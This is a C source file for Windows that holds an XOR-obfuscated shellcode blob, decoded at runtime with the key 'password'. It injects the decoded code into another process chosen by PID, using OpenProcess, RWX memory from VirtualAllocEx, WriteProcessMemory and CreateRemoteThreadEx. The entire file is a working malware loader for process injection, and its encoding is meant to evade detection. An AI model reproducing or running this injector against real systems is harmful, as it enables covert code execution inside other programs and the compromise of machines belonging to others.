#include <windows.h>
#include <stdio.h>
#include <string.h>

void XOR(unsigned char* payload, size_t payload_size, char* key, size_t key_size){
    for(size_t i = 0; i < payload_size; i++){
        payload[i] = payload[i] ^ key[i % key_size];
        printf("\\x%02x", payload[i]);
    }
}
unsigned char payload[] =
"\x8c\x29\xf2\x97\x87\x90\x8d\x9b\x98\xb1\x73\x73\x77\x2e\x23\x25\x20\x33\x22\x25\x3f\x5e\xa0\x01\x38\xea\x21\x13\x49\x27"
"\xf9\x36\x68\x5f\x3b\xf8\x25\x4f\x4c\x2c\xfb\x13\x23\x4d\x3f\x60\xc5\x2e\x3a\x2c\x42\xba\x3f\x5e\xb2\xc8\x4c\x00\x0f\x71"
"\x5b\x4f\x33\xa5\xb9\x6c\x32\x72\xb6\x8d\x9f\x36\x31\x30\x4d\x3b\xfc\x3d\x52\x5a\xfb\x23\x4f\x3b\x76\xbf\x4c\xef\xf0\xe9"
"\x73\x73\x77\x27\xf7\xa4\x04\x0e\x3b\x72\xa7\x3f\x4c\xef\x38\x79\x4d\x37\xfc\x2f\x52\x2d\x71\xb1\x90\x2f\x3f\x90\xbb\x5a"
"\x31\xea\x47\xfb\x3f\x6e\xa4\x29\x41\xa8\x3b\x42\xb7\xc3\x33\xa5\xb9\x6c\x32\x72\xb6\x57\x92\x11\x81\x5f\x3f\x70\x3b\x4b"
"\x7a\x21\x49\xb0\x06\xa5\x2f\x51\x36\xef\x30\x45\x3a\x72\xa7\x09\x4c\x25\xfb\x6d\x3b\x4d\x33\xe4\x32\x78\x39\x60\xa3\x4d"
"\x36\xe4\x76\xec\x38\x60\xa3\x32\x2f\x2e\x2a\x3a\x29\x3b\x32\x2b\x36\x36\x33\x3e\x38\xe2\x9f\x53\x36\x3d\x8d\x84\x28\x20"
"\x2a\x29\x49\x27\xf9\x76\x99\x28\x8c\x8c\x88\x32\x4c\x2c\xfd\xec\x59\x72\x77\x6f\x33\xde\x3c\x16\x55\x74\x88\xba\x3b\xa3"
"\xb1\x61\x73\x73\x77\x51\x3a\xe9\xe5\x6f\x72\x73\x77\x51\x3e\xe9\xf5\x7e\x72\x73\x77\x27\x43\xad\x31\xdb\x36\xf0\x21\x68"
"\x8d\xb1\x38\x50\xba\x32\xcd\x9f\xc7\xc6\x26\x9e\xa6\x3b\x12\x03\x1e\x0b\x5c\x41\x15\x01\x18\x02\x52\x29\x23\x27\x52\x73"
"\x3a\x0a\x01\x17\x11\x06\x16\x31\x18\x17\x72\x11\x03\x04\x01\x40\x45\x41\x16\x08\x1c\x61\x73";



int main(int argv, char **argc){
    XOR(payload, sizeof(payload), "password", strlen("password"));
    if (argv < 2) {
        printf("Usage: %s <PID>\n", argc[0]);
        return 1;
    }
    HANDLE hThread;
    DWORD PID = atoi(argc[1]);
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    void* mem = VirtualAllocEx(hProcess,NULL,sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess,mem,payload,sizeof(payload),NULL);
    hThread = CreateRemoteThreadEx(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)mem,NULL,0,NULL,NULL);
    if(hThread == INVALID_HANDLE_VALUE){
        printf("Error: %d\n", GetLastError());
        return 2;
    }
    WaitForSingleObject(hThread,INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
